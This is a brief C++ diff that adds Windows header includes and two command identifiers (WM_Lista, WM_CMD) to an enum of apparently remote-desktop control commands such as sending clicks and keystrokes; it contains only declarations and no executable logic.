@@ -28,6 +28,8 @@
 #include<lmcons.h>
 #include<intrin.h>
 #include<shlobj.h>
+#include<shlwapi.h>
+#include<gdiplus.h>
 
 #include "../aes256/aes256.hpp"
 #include "../zlib/zlib.h"
@@ -117,7 +119,9 @@ namespace EnumComandos {
         RD_Update_Q,
         RD_Update_Vmouse,
         RD_Send_Click,
-        RD_Send_Teclado
+        RD_Send_Teclado,
+        WM_Lista,
+        WM_CMD
     };
 }
 
